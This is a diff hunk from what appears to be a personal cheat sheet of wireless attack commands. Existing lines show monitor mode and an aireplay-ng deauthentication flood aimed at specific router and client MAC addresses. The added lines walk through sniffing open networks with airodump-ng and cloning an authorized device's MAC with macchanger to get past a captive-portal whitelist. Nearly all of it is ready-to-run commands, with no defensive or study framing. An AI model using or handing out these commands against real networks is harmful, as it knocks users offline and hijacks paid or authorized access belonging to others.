@@ -125,11 +125,30 @@ airemon-ng start external_radio 6 # the number is the channel  (TO START MONITOR
 kismet -c radio_name  ## GETS THE MAC ADDRESS 
 
 
-
 ## send deauth
 #1 find mac for router (-a) and client (-c)
 netdiscover -r 192.168.50.1/24
 aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
+
+
+### MAC ADDRESS RANDOMIZATION ( CELL PHONES )
+## conecting to portals --> swap mac address on whitelist with an already authorized Mac address 
+# 1. put card into wiresless monitor mode 
+# 2. find exisitng users on the whitelist. find the channel of ESSID 
+# 3. copy the mac connected to router. 
+sudo apt-get install macchanger aircrack-ng 
+sudo iwconfig wirelessInterface down 
+sudo macchanger -r wirelessInterface 
+ip a # to find current NICs in use 
+sudo airmon-ng start wirelessInterface # to put in into monitor mode 
+sudo airodump-ng wirelessInterface -c 11 --encrypt OPN # to see only open networks --> displays list of connected devices on network 
+sudo ifconfig nicNonMonitorMode down 
+sudo macchanger -m newMacfromabove nicNonMonitormode 
+sudo ifconfig nicNonMonitorMode up 
+
+
+################################
+
 
 ###########################
 ### IFRENAME ### 
